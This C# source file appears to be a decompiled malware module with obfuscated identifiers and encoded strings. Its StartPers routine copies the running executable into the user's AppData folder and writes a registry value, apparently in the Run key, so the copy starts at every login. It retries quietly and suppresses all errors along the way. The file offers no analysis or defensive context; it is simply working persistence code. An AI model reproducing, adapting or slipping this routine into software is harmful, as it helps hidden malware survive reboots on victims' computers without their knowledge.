using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class DAStartup
{
	public class Startupdll
	{
		public static string MyVAL = UYGQQYLC.WEGPJNXO("aK+vt6dFkrCzqIqyIw==", "False");

		public static string MYPTH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("hZG4ubqYt768vIUe", "False") + UYGQQYLC.WEGPJNXO("ZbSuurKIpni2u4kj", "False");

		public static void StartPers()
		{
			int num = 0;
			try
			{
				if (!File.Exists(MYPTH))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, MYPTH, overwrite: true);
				}
			}
			catch (Exception ex)
			{
				int num2 = default(int);
				ProjectData.SetProjectError(ex, num2);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				int num2 = 1;
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(UYGQQYLC.WEGPJNXO("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
					registryKey.SetValue(MyVAL, MYPTH);
					registryKey.Close();
					Thread.Sleep(5000);
					try
					{
						UGMVUKMJ.STRTTHRD.Abort();
						break;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num2);
					if (num == 3)
					{
						try
						{
							UGMVUKMJ.STRTTHRD.Abort();
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4, num2);
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
						break;
					}
					num = checked(num + 1);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
